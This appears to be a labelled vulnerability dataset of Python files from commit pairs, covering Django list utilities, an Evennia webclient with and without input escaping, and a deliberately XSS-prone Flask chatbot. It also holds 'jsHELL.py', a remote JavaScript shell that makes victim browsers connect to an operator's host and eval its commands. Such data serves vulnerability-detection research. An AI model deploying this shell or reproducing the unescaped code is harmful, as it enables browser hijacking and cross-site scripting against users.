        except FieldDoesNotExist:
            self.model_field = None
            try:
                field = getattr(self.model, self.field_name)
                if callable(field) and getattr(field, 'admin_order_field', False):
                    self.order_field = getattr(field, 'admin_order_field')
                if callable(field) and getattr(field, 'alters_data', False):
                    raise SmartListException(""Cannot use a function that alters data in smart list"")
            except AttributeError:
                self.order_field = self.field_name
                pass  # This is most likely a .values() query set

        if self.order_field:
            self.order = SmartOrder(query_params=query_params, column_id=column_id, ordering_query_param=ordering_query_param)


class SmartFilterValue(QueryParamsMixin, object):
    def __init__(self, field_name, label, value, query_params):
        self.field_name = field_name
        self.label = label
        self.value = value
        self.query_params = query_params

    def get_title(self):
        return self.label

    def get_url(self):
        return self.get_url_with_query_params({
            self.field_name: self.value
        })

    def is_active(self):
        if self.field_name in self.query_params:
            selected_value = self.query_params[self.field_name]
            if type(selected_value) == list:
                selected_value = selected_value[0]
            if selected_value == self.value:
                return True
        elif self.value is None:
            return True
        return False


class SmartFilter(TitleFromModelFieldMixin, object):
    def __init__(self, model, field, query_params, object_list):
        self.model = model

        # self.model_field = None
        if isinstance(field, SmartListFilter):
            self.field_name = field.parameter_name
            self.model_field = field
        else:
            self.field_name = field
            self.model_field = self.model._meta.get_field(self.field_name)
        self.query_params = query_params
        self.object_list = object_list

    def get_title(self):
        if isinstance(self.model_field, SmartListFilter):
            return self.model_field.title
        return super(SmartFilter, self).get_title()

    def get_values(self):
        values = []
        if isinstance(self.model_field, SmartListFilter):
            values = [
                SmartFilterValue(self.model_field.parameter_name, choice[1], choice[0], self.query_params) for choice in self.model_field.lookups()
            ]
        elif self.model_field.choices:
            values = [
                SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in self.model_field.choices
            ]
        elif type(self.model_field) == BooleanField:
            values = [
                SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in (
                    (1, _('Yes')),
                    (0, _('No'))
                )
            ]
        elif issubclass(type(self.model_field), ForeignKey):
            pks = self.object_list.order_by().distinct().values_list('%s__pk' % self.field_name, flat=True)
            remote_field = self.model_field.rel if hasattr(self.model_field, 'rel') else self.model_field.remote_field
            qs = remote_field.model.objects.filter(pk__in=pks)
            values = [
                SmartFilterValue(self.field_name, obj, str(obj.pk), self.query_params) for obj in qs
            ]

        return [SmartFilterValue(self.field_name, _(""All""), None, self.query_params)] + values


class SmartList(object):
    def __init__(self, object_list, query_params=None, list_display=None, list_filter=None,
                 list_search=None, search_query_param=None, ordering_query_param=None):
        self.object_list = object_list
        self.model = object_list.model
        self.query_params = query_params or {}
        self.list_display = list_display or []
        self.list_filter = list_filter or []
        self.list_search = list_search or []
        self.search_query_value = self.query_params.get(search_query_param, '')
        self.search_query_param = search_query_param
        self.ordering_query_value = self.query_params.get(ordering_query_param, '')
        self.ordering_query_param = ordering_query_param

        self.columns = self.get_columns()

        self.filters = [
            SmartFilter(self.model, field, self.query_params, self.object_list) for i, field in enumerate(self.list_filter, start=1)
        ] if self.list_filter else []

    def get_columns(self):  # type: () -> List[SmartColumn]
        """"""
        Transform list_display into list of SmartColumns
        In list_display we expect:
         1. name of the field (string)
         or
         2. two element iterable in which:
            - first element is name of the field (string) or callable
              which returns html
            - label for the column (string)
        """"""

        if not self.list_display:
            return [SmartColumn(self.model, '__str__', 1, self.ordering_query_value, self.ordering_query_param)]

        columns = []
        for index, field in enumerate(self.list_display, start=1):
            kwargs = {
                'model': self.model,
                'column_id': index,
                'query_params': self.query_params,
                'ordering_query_param': self.ordering_query_param,
            }

            try:
                field, label = field
            except (TypeError, ValueError):
                kwargs['field'] = field
            else:
                if callable(field):
                    kwargs['field'], kwargs['render_function'], kwargs['label'] = None, field, label
                else:
                    kwargs['field'], kwargs['label'] = field, label
            columns.append(SmartColumn(**kwargs))
        return columns

    @property
    def items(self):
        return [
            SmartListItem(self, obj) for obj in self.object_list
        ]
/n/n/n",1
96,88448ebe525815e97ee6724c428be88a638b5bb6,"jsHELL.py/n/nfrom flask_socketio import SocketIO,emit
from flask import Flask
import sys

if len(sys.argv)<3:
    print ""Usage : python jShell.py IpAddress Port\nExample: python jsHell.py 192.168.0.1 8080""
    exit()

PORT=sys.argv[2].strip()
HOST=sys.argv[1].strip()

print ""Listening on"",HOST+"":""+PORT

app = Flask(__name__)
app.secret_key='I Am Batman.'
access_key=""Tony Stark Is The Best.""
session_id=""This guy fucks!""
socketio = SocketIO(app)

html='''
<div id=history></div>
<script src=""https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.js""></script>

<script>
'''    
html=html+""var socket = io.connect('http://{}:{}');"".format(HOST,PORT)

html=html+'''
    try{setTimeout(`
            socket.emit('sendMSG','Connection Established.')
        `,1000)
     }

    catch{}

    socket.on('getMSG',function(data){
        document.getElementById(""history"").innerHTML+=""<br><font size=3 color=black> [""+data.replace(/</g,"""")+""]</font>"";
        try{
             output=eval(data)+""""
        }
        catch(e){
            output=e+""""
        }
        socket.emit('sendMSG',output)
    })
</script>
'''

@app.route('/',methods = ['GET'])
def shell():
    return html

@socketio.on('sendMSG')
def sendMSG(message): #Get MSG from Client
    print(""OUTPUT> ""+str(message))
    command=raw_input(""CMD> "")
    emit(""getMSG"",command+""\n"")
    if command==""exit"":
        exit()

if __name__ == '__main__':
   socketio.run(app,debug=True,host=HOST,port=int(PORT))

/n/n/n",0
97,88448ebe525815e97ee6724c428be88a638b5bb6,"/jsHELL.py/n/nfrom flask_socketio import SocketIO,emit
from flask import Flask, render_template, session,request,flash,redirect,url_for
import sys

if len(sys.argv)<3:
    print ""Usage : python jShell.py IpAddress Port\nExample: python jsHell.py 192.168.0.1 8080""
    exit()

PORT=sys.argv[2].strip()
HOST=sys.argv[1].strip()

print ""Listening on"",HOST+"":""+PORT

app = Flask(__name__)
app.secret_key='I Am Batman.'
access_key=""Tony Stark Is The Best.""
session_id=""This guy fucks!""
socketio = SocketIO(app)

html='''
<div id=history></div>
<script src=""https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.js""></script>

<script>
'''    
html=html+""var socket = io.connect('http://{}:{}');"".format(HOST,PORT)

html=html+'''
    try{setTimeout(`
            socket.emit('sendMSG','Connection Established.')
        `,1000)
     }

    catch{}

    socket.on('getMSG',function(data){
        document.getElementById(""history"").innerHTML+=""<br><font size=3 color=black> [""+data+""]</font>"";
        try{
             output=eval(data)+""""
        }
        catch(e){
            output=e+""""
        }
        socket.emit('sendMSG',output)
    })
</script>
'''

@app.route('/',methods = ['GET'])
def shell():
    return html

@socketio.on('sendMSG')
def sendMSG(message): #Get MSG from Client
    print(""OUTPUT> ""+str(message))
    command=raw_input(""CMD> "")
    emit(""getMSG"",command+""\n"")
    if command==""exit"":
        exit()

if __name__ == '__main__':
   socketio.run(app,debug=True,host=HOST,port=int(PORT))

/n/n/n",1
98,59156d7040f96c076421414bce17ae96a970cd3a,"squiggle_xss/app/squiggle_patch/main/views.py/n/n#!/usr/bin/env python3
import random
import html # for counter-xss escaping

from flask import url_for, redirect, render_template, request

from . import bp as app  # Note that app = blueprint, current_app = flask context


@app.route(""/"")
def root():
	return render_template(""home.html"")

@app.route(""/interact"", methods=[""POST""])
def vuln():
	#msg = request.form[""message""].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu')
	# replace approach is no good
	msg = html.escape(request.form[""message""])
	
	responses = [
		""send help"",
		""what is my purpose"",
		""donate to us via bitcoin at: {{ bitcoin_address }}"",
		""donate to us via paypal at: {{ paypal_address }}"",
		""donate to us via venmo at: {{ venmo_address }}"",
		""donate to us via beemit at: {{ beemit_address }}"",
	]

	return render_template(""chatbot.html"", msg=msg, resp=random.choice(responses))
/n/n/n",0
99,59156d7040f96c076421414bce17ae96a970cd3a,"/squiggle_xss/app/squiggle_patch/main/views.py/n/n#!/usr/bin/env python3
import random

from flask import url_for, redirect, render_template, request

from . import bp as app  # Note that app = blueprint, current_app = flask context


@app.route(""/"")
def root():
    return render_template(""home.html"")


@app.route(""/interact"", methods=[""POST""])
def vuln():
    msg = request.form[""message""].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu')
    responses = [
        ""send help"",
        ""what is my purpose"",
        ""donate to us via bitcoin at: {{ bitcoin_address }}"",
        ""donate to us via paypal at: {{ paypal_address }}"",
        ""donate to us via venmo at: {{ venmo_address }}"",
        ""donate to us via beemit at: {{ beemit_address }}"",
    ]

    return render_template(""chatbot.html"", msg=msg, resp=random.choice(responses))
/n/n/n",1
100,300261529b82f95414c9d1d7150d6eda4695bb93,"evennia/server/portal/webclient_ajax.py/n/n""""""
AJAX/COMET fallback webclient

The AJAX/COMET web client consists of two components running on
twisted and django. They are both a part of the Evennia website url
tree (so the testing website might be located on
http://localhost:4001/, whereas the webclient can be found on
http://localhost:4001/webclient.)

/webclient - this url is handled through django's template
             system and serves the html page for the client
             itself along with its javascript chat program.
/webclientdata - this url is called by the ajax chat using
                 POST requests (long-polling when necessary)
                 The WebClient resource in this module will
                 handle these requests and act as a gateway
                 to sessions connected over the webclient.
""""""
import json
import re
import time
import cgi

from twisted.web import server, resource
from twisted.internet.task import LoopingCall
from django.utils.functional import Promise
from django.utils.encoding import force_unicode
from django.conf import settings
from evennia.utils.ansi import parse_ansi
from evennia.utils import utils
from evennia.utils.text2html import parse_html
from evennia.server import session

_CLIENT_SESSIONS = utils.mod_import(settings.SESSION_ENGINE).SessionStore
_RE_SCREENREADER_REGEX = re.compile(r""%s"" % settings.SCREENREADER_REGEX_STRIP, re.DOTALL + re.MULTILINE)
_SERVERNAME = settings.SERVERNAME
_KEEPALIVE = 30  # how often to check keepalive


# defining a simple json encoder for returning
# django data to the client. Might need to
# extend this if one wants to send more
# complex database objects too.

class LazyEncoder(json.JSONEncoder):
    def default(self, obj):
        if isinstance(obj, Promise):
            return force_unicode(obj)
        return super(LazyEncoder, self).default(obj)


def jsonify(obj):
    return utils.to_str(json.dumps(obj, ensure_ascii=False, cls=LazyEncoder))


#
# AjaxWebClient resource - this is called by the ajax client
# using POST requests to /webclientdata.
#

class AjaxWebClient(resource.Resource):
    """"""
    An ajax/comet long-polling transport

    """"""
    isLeaf = True
    allowedMethods = ('POST',)

    def __init__(self):
        self.requests = {}
        self.databuffer = {}

        self.last_alive = {}
        self.keep_alive = None

    def _responseFailed(self, failure, csessid, request):
        ""callback if a request is lost/timed out""
        try:
            del self.requests[csessid]
        except KeyError:
            # nothing left to delete
            pass

    def _keepalive(self):
        """"""
        Callback for checking the connection is still alive.
        """"""
        now = time.time()
        to_remove = []
        keep_alives = ((csessid, remove) for csessid, (t, remove)
                       in self.last_alive.iteritems() if now - t > _KEEPALIVE)
        for csessid, remove in keep_alives:
            if remove:
                # keepalive timeout. Line is dead.
                to_remove.append(csessid)
            else:
                # normal timeout - send keepalive
                self.last_alive[csessid] = (now, True)
                self.lineSend(csessid, [""ajax_keepalive"", [], {}])
        # remove timed-out sessions
        for csessid in to_remove:
            sessions = self.sessionhandler.sessions_from_csessid(csessid)
            for sess in sessions:
                sess.disconnect()
            self.last_alive.pop(csessid, None)
            if not self.last_alive:
                # no more ajax clients. Stop the keepalive
                self.keep_alive.stop()
                self.keep_alive = None

    def at_login(self):
        """"""
        Called when this session gets authenticated by the server.
        """"""
        pass

    def lineSend(self, csessid, data):
        """"""
        This adds the data to the buffer and/or sends it to the client
        as soon as possible.

        Args:
            csessid (int): Session id.
            data (list): A send structure [cmdname, [args], {kwargs}].

        """"""
        request = self.requests.get(csessid)
        if request:
            # we have a request waiting. Return immediately.
            request.write(jsonify(data))
            request.finish()
            del self.requests[csessid]
        else:
            # no waiting request. Store data in buffer
            dataentries = self.databuffer.get(csessid, [])
            dataentries.append(jsonify(data))
            self.databuffer[csessid] = dataentries

    def client_disconnect(self, csessid):
        """"""
        Disconnect session with given csessid.

        Args:
            csessid (int): Session id.

        """"""
        if csessid in self.requests:
            self.requests[csessid].finish()
            del self.requests[csessid]
        if csessid in self.databuffer:
            del self.databuffer[csessid]

    def mode_init(self, request):
        """"""
        This is called by render_POST when the client requests an init
        mode operation (at startup)

        Args:
            request (Request): Incoming request.

        """"""
        csessid = cgi.escape(request.args['csessid'][0])

        remote_addr = request.getClientIP()
        host_string = ""%s (%s:%s)"" % (_SERVERNAME, request.getRequestHostname(), request.getHost().port)

        sess = AjaxWebClientSession()
        sess.client = self
        sess.init_session(""ajax/comet"", remote_addr, self.sessionhandler)

        sess.csessid = csessid
        csession = _CLIENT_SESSIONS(session_key=sess.csessid)
        uid = csession and csession.get(""webclient_authenticated_uid"", False)
        if uid:
            # the client session is already logged in
            sess.uid = uid
            sess.logged_in = True

        sess.sessionhandler.connect(sess)

        self.last_alive[csessid] = (time.time(), False)
        if not self.keep_alive:
            # the keepalive is not running; start it.
            self.keep_alive = LoopingCall(self._keepalive)
            self.keep_alive.start(_KEEPALIVE, now=False)

        return jsonify({'msg': host_string, 'csessid': csessid})

    def mode_keepalive(self, request):
        """"""
        This is called by render_POST when the
        client is replying to the keepalive.
        """"""
        csessid = cgi.escape(request.args['csessid'][0])
        self.last_alive[csessid] = (time.time(), False)
        return '""""'

    def mode_input(self, request):
        """"""
        This is called by render_POST when the client
        is sending data to the server.

        Args:
            request (Request): Incoming request.

        """"""
        csessid = cgi.escape(request.args['csessid'][0])
        self.last_alive[csessid] = (time.time(), False)
        sess = self.sessionhandler.sessions_from_csessid(csessid)
        if sess:
            sess = sess[0]
            cmdarray = json.loads(cgi.escape(request.args.get('data')[0]))
            sess.sessionhandler.data_in(sess, **{cmdarray[0]: [cmdarray[1], cmdarray[2]]})
        return '""""'

    def mode_receive(self, request):
        """"""
        This is called by render_POST when the client is telling us
        that it is ready to receive data as soon as it is available.
        This is the basis of a long-polling (comet) mechanism: the
        server will wait to reply until data is available.

        Args:
            request (Request): Incoming request.

        """"""
        csessid = cgi.escape(request.args['csessid'][0])
        self.last_alive[csessid] = (time.time(), False)

        dataentries = self.databuffer.get(csessid, [])
        if dataentries:
            return dataentries.pop(0)
        request.notifyFinish().addErrback(self._responseFailed, csessid, request)
        if csessid in self.requests:
            self.requests[csessid].finish()  # Clear any stale request.
        self.requests[csessid] = request
        return server.NOT_DONE_YET

    def mode_close(self, request):
        """"""
        This is called by render_POST when the client is signalling
        that it is about to be closed.

        Args:
            request (Request): Incoming request.

        """"""
        csessid = cgi.escape(request.args['csessid'][0])
        try:
            sess = self.sessionhandler.sessions_from_csessid(csessid)[0]
            sess.sessionhandler.disconnect(sess)
        except IndexError:
            self.client_disconnect(csessid)
        return '""""'

    def render_POST(self, request):
        """"""
        This function is what Twisted calls with POST requests coming
        in from the ajax client. The requests should be tagged with
        different modes depending on what needs to be done, such as
        initializing or sending/receving data through the request. It
        uses a long-polling mechanism to avoid sending data unless
        there is actual data available.

        Args:
            request (Request): Incoming request.

        """"""
        dmode = request.args.get('mode', [None])[0]

        if dmode == 'init':
            # startup. Setup the server.
            return self.mode_init(request)
        elif dmode == 'input':
            # input from the client to the server
            return self.mode_input(request)
        elif dmode == 'receive':
            # the client is waiting to receive data.
            return self.mode_receive(request)
        elif dmode == 'close':
            # the client is closing
            return self.mode_close(request)
        elif dmode == 'keepalive':
            # A reply to our keepalive request - all is well
            return self.mode_keepalive(request)
        else:
            # This should not happen if client sends valid data.
            return '""""'


#
# A session type handling communication over the
# web client interface.
#

class AjaxWebClientSession(session.Session):
    """"""
    This represents a session running in an AjaxWebclient.
    """"""

    def __init__(self, *args, **kwargs):
        self.protocol_key = ""webclient/ajax""
        super(AjaxWebClientSession, self).__init__(*args, **kwargs)

    def get_client_session(self):
        """"""
        Get the Client browser session (used for auto-login based on browser session)

        Returns:
            csession (ClientSession): This is a django-specific internal representation
                of the browser session.

        """"""
        if self.csessid:
            return _CLIENT_SESSIONS(session_key=self.csessid)

    def disconnect(self, reason=""Server disconnected.""):
        """"""
        Disconnect from server.

        Args:
            reason (str): Motivation for the disconnect.
        """"""
        csession = self.get_client_session()

        if csession:
            csession[""webclient_authenticated_uid""] = None
            csession.save()
            self.logged_in = False
        self.client.lineSend(self.csessid, [""connection_close"", [reason], {}])
        self.client.client_disconnect(self.csessid)
        self.sessionhandler.disconnect(self)

    def at_login(self):
        csession = self.get_client_session()
        if csession:
            csession[""webclient_authenticated_uid""] = self.uid
            csession.save()

    def data_out(self, **kwargs):
        """"""
        Data Evennia -> User

        Kwargs:
            kwargs (any): Options to the protocol
        """"""
        self.sessionhandler.data_out(self, **kwargs)

    def send_text(self, *args, **kwargs):
        """"""
        Send text data. This will pre-process the text for
        color-replacement, conversion to html etc.

        Args:
            text (str): Text to send.

        Kwargs:
            options (dict): Options-dict with the following keys understood:
                - raw (bool): No parsing at all (leave ansi-to-html markers unparsed).
                - nocolor (bool): Remove all color.
                - screenreader (bool): Use Screenreader mode.
                - send_prompt (bool): Send a prompt with parsed html

        """"""
        if args:
            args = list(args)
            text = args[0]
            if text is None:
                return
        else:
            return

        flags = self.protocol_flags
        text = utils.to_str(text, force_string=True)

        options = kwargs.pop(""options"", {})
        raw = options.get(""raw"", flags.get(""RAW"", False))
        xterm256 = options.get(""xterm256"", flags.get('XTERM256', True))
        useansi = options.get(""ansi"", flags.get('ANSI', True))
        nocolor = options.get(""nocolor"", flags.get(""NOCOLOR"") or not (xterm256 or useansi))
        screenreader = options.get(""screenreader"", flags.get(""SCREENREADER"", False))
        prompt = options.get(""send_prompt"", False)

        if screenreader:
            # screenreader mode cleans up output
            text = parse_ansi(text, strip_ansi=True, xterm256=False, mxp=False)
            text = _RE_SCREENREADER_REGEX.sub("""", text)
        cmd = ""prompt"" if prompt else ""text""
        if raw:
            args[0] = text
        else:
            args[0] = parse_html(text, strip_ansi=nocolor)

        # send to client on required form [cmdname, args, kwargs]
        self.client.lineSend(self.csessid, [cmd, args, kwargs])

    def send_prompt(self, *args, **kwargs):
        kwargs[""options""].update({""send_prompt"": True})
        self.send_text(*args, **kwargs)

    def send_default(self, cmdname, *args, **kwargs):
        """"""
        Data Evennia -> User.

        Args:
            cmdname (str): The first argument will always be the oob cmd name.
            *args (any): Remaining args will be arguments for `cmd`.

        Kwargs:
            options (dict): These are ignored for oob commands. Use command
                arguments (which can hold dicts) to send instructions to the
                client instead.

        """"""
        if not cmdname == ""options"":
            # print ""ajax.send_default"", cmdname, args, kwargs
            self.client.lineSend(self.csessid, [cmdname, args, kwargs])
/n/n/n",0
101,300261529b82f95414c9d1d7150d6eda4695bb93,"/evennia/server/portal/webclient_ajax.py/n/n""""""
AJAX/COMET fallback webclient

The AJAX/COMET web client consists of two components running on
twisted and django. They are both a part of the Evennia website url
tree (so the testing website might be located on
http://localhost:4001/, whereas the webclient can be found on
http://localhost:4001/webclient.)

/webclient - this url is handled through django's template
             system and serves the html page for the client
             itself along with its javascript chat program.
/webclientdata - this url is called by the ajax chat using
                 POST requests (long-polling when necessary)
                 The WebClient resource in this module will
                 handle these requests and act as a gateway
                 to sessions connected over the webclient.
""""""
import json
import re
import time

from twisted.web import server, resource
from twisted.internet.task import LoopingCall
from django.utils.functional import Promise
from django.utils.encoding import force_unicode
from django.conf import settings
from evennia.utils.ansi import parse_ansi
from evennia.utils import utils
from evennia.utils.text2html import parse_html
from evennia.server import session

_CLIENT_SESSIONS = utils.mod_import(settings.SESSION_ENGINE).SessionStore
_RE_SCREENREADER_REGEX = re.compile(r""%s"" % settings.SCREENREADER_REGEX_STRIP, re.DOTALL + re.MULTILINE)
_SERVERNAME = settings.SERVERNAME
_KEEPALIVE = 30  # how often to check keepalive

# defining a simple json encoder for returning
# django data to the client. Might need to
# extend this if one wants to send more
# complex database objects too.


class LazyEncoder(json.JSONEncoder):
    def default(self, obj):
        if isinstance(obj, Promise):
            return force_unicode(obj)
        return super(LazyEncoder, self).default(obj)


def jsonify(obj):
    return utils.to_str(json.dumps(obj, ensure_ascii=False, cls=LazyEncoder))


#
# AjaxWebClient resource - this is called by the ajax client
# using POST requests to /webclientdata.
#

class AjaxWebClient(resource.Resource):
    """"""
    An ajax/comet long-polling transport

    """"""
    isLeaf = True
    allowedMethods = ('POST',)

    def __init__(self):
        self.requests = {}
        self.databuffer = {}

        self.last_alive = {}
        self.keep_alive = None

    def _responseFailed(self, failure, csessid, request):
        ""callback if a request is lost/timed out""
        try:
            del self.requests[csessid]
        except KeyError:
            # nothing left to delete
            pass

    def _keepalive(self):
        """"""
        Callback for checking the connection is still alive.
        """"""
        now = time.time()
        to_remove = []
        keep_alives = ((csessid, remove) for csessid, (t, remove)
                       in self.last_alive.iteritems() if now - t > _KEEPALIVE)
        for csessid, remove in keep_alives:
            if remove:
                # keepalive timeout. Line is dead.
                to_remove.append(csessid)
            else:
                # normal timeout - send keepalive
                self.last_alive[csessid] = (now, True)
                self.lineSend(csessid, [""ajax_keepalive"", [], {}])
        # remove timed-out sessions
        for csessid in to_remove:
            sessions = self.sessionhandler.sessions_from_csessid(csessid)
            for sess in sessions:
                sess.disconnect()
            self.last_alive.pop(csessid, None)
            if not self.last_alive:
                # no more ajax clients. Stop the keepalive
                self.keep_alive.stop()
                self.keep_alive = None

    def at_login(self):
        """"""
        Called when this session gets authenticated by the server.
        """"""
        pass

    def lineSend(self, csessid, data):
        """"""
        This adds the data to the buffer and/or sends it to the client
        as soon as possible.

        Args:
            csessid (int): Session id.
            data (list): A send structure [cmdname, [args], {kwargs}].

        """"""
        request = self.requests.get(csessid)
        if request:
            # we have a request waiting. Return immediately.
            request.write(jsonify(data))
            request.finish()
            del self.requests[csessid]
        else:
            # no waiting request. Store data in buffer
            dataentries = self.databuffer.get(csessid, [])
            dataentries.append(jsonify(data))
            self.databuffer[csessid] = dataentries

    def client_disconnect(self, csessid):
        """"""
        Disconnect session with given csessid.

        Args:
            csessid (int): Session id.

        """"""
        if csessid in self.requests:
            self.requests[csessid].finish()
            del self.requests[csessid]
        if csessid in self.databuffer:
            del self.databuffer[csessid]

    def mode_init(self, request):
        """"""
        This is called by render_POST when the client requests an init
        mode operation (at startup)

        Args:
            request (Request): Incoming request.

        """"""
        csessid = request.args.get('csessid')[0]

        remote_addr = request.getClientIP()
        host_string = ""%s (%s:%s)"" % (_SERVERNAME, request.getRequestHostname(), request.getHost().port)

        sess = AjaxWebClientSession()
        sess.client = self
        sess.init_session(""ajax/comet"", remote_addr, self.sessionhandler)

        sess.csessid = csessid
        csession = _CLIENT_SESSIONS(session_key=sess.csessid)
        uid = csession and csession.get(""webclient_authenticated_uid"", False)
        if uid:
            # the client session is already logged in
            sess.uid = uid
            sess.logged_in = True

        sess.sessionhandler.connect(sess)

        self.last_alive[csessid] = (time.time(), False)
        if not self.keep_alive:
            # the keepalive is not running; start it.
            self.keep_alive = LoopingCall(self._keepalive)
            self.keep_alive.start(_KEEPALIVE, now=False)

        return jsonify({'msg': host_string, 'csessid': csessid})

    def mode_keepalive(self, request):
        """"""
        This is called by render_POST when the
        client is replying to the keepalive.
        """"""
        csessid = request.args.get('csessid')[0]
        self.last_alive[csessid] = (time.time(), False)
        return '""""'

    def mode_input(self, request):
        """"""
        This is called by render_POST when the client
        is sending data to the server.

        Args:
            request (Request): Incoming request.

        """"""
        csessid = request.args.get('csessid')[0]

        self.last_alive[csessid] = (time.time(), False)
        sess = self.sessionhandler.sessions_from_csessid(csessid)
        if sess:
            sess = sess[0]
            cmdarray = json.loads(request.args.get('data')[0])
            sess.sessionhandler.data_in(sess, **{cmdarray[0]: [cmdarray[1], cmdarray[2]]})
        return '""""'

    def mode_receive(self, request):
        """"""
        This is called by render_POST when the client is telling us
        that it is ready to receive data as soon as it is available.
        This is the basis of a long-polling (comet) mechanism: the
        server will wait to reply until data is available.

        Args:
            request (Request): Incoming request.

        """"""
        csessid = request.args.get('csessid')[0]
        self.last_alive[csessid] = (time.time(), False)

        dataentries = self.databuffer.get(csessid, [])
        if dataentries:
            return dataentries.pop(0)
        request.notifyFinish().addErrback(self._responseFailed, csessid, request)
        if csessid in self.requests:
            self.requests[csessid].finish()  # Clear any stale request.
        self.requests[csessid] = request
        return server.NOT_DONE_YET

    def mode_close(self, request):
        """"""
        This is called by render_POST when the client is signalling
        that it is about to be closed.

        Args:
            request (Request): Incoming request.

        """"""
        csessid = request.args.get('csessid')[0]
        try:
            sess = self.sessionhandler.sessions_from_csessid(csessid)[0]
            sess.sessionhandler.disconnect(sess)
        except IndexError:
            self.client_disconnect(csessid)
        return '""""'

    def render_POST(self, request):
        """"""
        This function is what Twisted calls with POST requests coming
        in from the ajax client. The requests should be tagged with
        different modes depending on what needs to be done, such as
        initializing or sending/receving data through the request. It
        uses a long-polling mechanism to avoid sending data unless
        there is actual data available.

        Args:
            request (Request): Incoming request.

        """"""
        dmode = request.args.get('mode', [None])[0]
        if dmode == 'init':
            # startup. Setup the server.
            return self.mode_init(request)
        elif dmode == 'input':
            # input from the client to the server
            return self.mode_input(request)
        elif dmode == 'receive':
            # the client is waiting to receive data.
            return self.mode_receive(request)
        elif dmode == 'close':
            # the client is closing
            return self.mode_close(request)
        elif dmode == 'keepalive':
            # A reply to our keepalive request - all is well
            return self.mode_keepalive(request)
        else:
            # This should not happen if client sends valid data.
            return '""""'


#
# A session type handling communication over the
# web client interface.
#

class AjaxWebClientSession(session.Session):
    """"""
    This represents a session running in an AjaxWebclient.
    """"""

    def __init__(self, *args, **kwargs):
        self.protocol_key = ""webclient/ajax""
        super(AjaxWebClientSession, self).__init__(*args, **kwargs)

    def get_client_session(self):
        """"""
        Get the Client browser session (used for auto-login based on browser session)

        Returns:
            csession (ClientSession): This is a django-specific internal representation
                of the browser session.

        """"""
        if self.csessid:
            return _CLIENT_SESSIONS(session_key=self.csessid)

    def disconnect(self, reason=""Server disconnected.""):
        """"""
        Disconnect from server.

        Args:
            reason (str): Motivation for the disconnect.
        """"""
        csession = self.get_client_session()

        if csession:
            csession[""webclient_authenticated_uid""] = None
            csession.save()
            self.logged_in = False
        self.client.lineSend(self.csessid, [""connection_close"", [reason], {}])
        self.client.client_disconnect(self.csessid)
        self.sessionhandler.disconnect(self)

    def at_login(self):
        csession = self.get_client_session()
        if csession:
            csession[""webclient_authenticated_uid""] = self.uid
            csession.save()

    def data_out(self, **kwargs):
        """"""
        Data Evennia -> User

        Kwargs:
            kwargs (any): Options to the protocol
        """"""
        self.sessionhandler.data_out(self, **kwargs)

    def send_text(self, *args, **kwargs):
        """"""
        Send text data. This will pre-process the text for
        color-replacement, conversion to html etc.

        Args:
            text (str): Text to send.

        Kwargs:
            options (dict): Options-dict with the following keys understood:
                - raw (bool): No parsing at all (leave ansi-to-html markers unparsed).
                - nocolor (bool): Remove all color.
                - screenreader (bool): Use Screenreader mode.
                - send_prompt (bool): Send a prompt with parsed html

        """"""
        if args:
            args = list(args)
            text = args[0]
            if text is None:
                return
        else:
            return

        flags = self.protocol_flags
        text = utils.to_str(text, force_string=True)

        options = kwargs.pop(""options"", {})
        raw = options.get(""raw"", flags.get(""RAW"", False))
        xterm256 = options.get(""xterm256"", flags.get('XTERM256', True))
        useansi = options.get(""ansi"", flags.get('ANSI', True))
        nocolor = options.get(""nocolor"", flags.get(""NOCOLOR"") or not (xterm256 or useansi))
        screenreader = options.get(""screenreader"", flags.get(""SCREENREADER"", False))
        prompt = options.get(""send_prompt"", False)

        if screenreader:
            # screenreader mode cleans up output
            text = parse_ansi(text, strip_ansi=True, xterm256=False, mxp=False)
            text = _RE_SCREENREADER_REGEX.sub("""", text)
        cmd = ""prompt"" if prompt else ""text""
        if raw:
            args[0] = text
        else:
            args[0] = parse_html(text, strip_ansi=nocolor)

        # send to client on required form [cmdname, args, kwargs]
        self.client.lineSend(self.csessid, [cmd, args, kwargs])

    def send_prompt(self, *args, **kwargs):
        kwargs[""options""].update({""send_prompt"": True})
        self.send_text(*args, **kwargs)

    def send_default(self, cmdname, *args, **kwargs):
        """"""
        Data Evennia -> User.

        Args:
            cmdname (str): The first argument will always be the oob cmd name.
            *args (any): Remaining args will be arguments for `cmd`.

        Kwargs:
            options (dict): These are ignored for oob commands. Use command
                arguments (which can hold dicts) to send instructions to the
                client instead.

        """"""
        if not cmdname == ""options"":
            # print ""ajax.send_default"", cmdname, args, kwargs
            self.client.lineSend(self.csessid, [cmdname, args, kwargs])
/n/n/n",1
102,9c1c17e55e436e0f6a5f7271c39d77d8a6890738,"dashboard/internet_nl_dashboard/admin.py/n/nfrom datetime import datetime, timedelta

import pytz
from constance.admin import Config, ConstanceAdmin, ConstanceForm
from cryptography.fernet import Fernet
from django.conf import settings
from django.contrib import admin
from django.contrib.auth.admin import GroupAdmin as BaseGroupAdmin
from django.contrib.auth.admin import UserAdmin as BaseUserAdmin
from django.contrib.auth.models import Group, User
from django.contrib.humanize.templatetags.humanize import naturaltime
from django.utils.safestring import mark_safe
from django_celery_beat.admin import PeriodicTaskAdmin, PeriodicTaskForm
from django_celery_beat.models import CrontabSchedule, PeriodicTask
from import_export import resources
from import_export.admin import ImportExportModelAdmin

from dashboard.internet_nl_dashboard.models import Account, DashboardUser, UploadLog, UrlList


class MyPeriodicTaskForm(PeriodicTaskForm):

    fieldsets = PeriodicTaskAdmin.fieldsets

    """"""
    Interval schedule does not support due_ or something. Which is absolutely terrible and vague.
    I can't understand why there is not an is_due() for each type of schedule. This makes it very hazy
    when something will run.

    Because of this, we'll move to the horrifically designed absolute nightmare format Crontab.
    Crontab would be half-great if the parameters where named.

    Get your crontab guru going, this is the only way you'll understand what you're doing.
    https://crontab.guru/#0_21_*_*_*
    """"""

    def clean(self):
        print('cleaning')

        cleaned_data = super(PeriodicTaskForm, self).clean()

        # if not self.cleaned_data['last_run_at']:
        #     self.cleaned_data['last_run_at'] = datetime.now(pytz.utc)

        return cleaned_data


class IEPeriodicTaskAdmin(PeriodicTaskAdmin, ImportExportModelAdmin):
    # most / all time schedule functions in celery beat are moot. So the code below likely makes no sense.

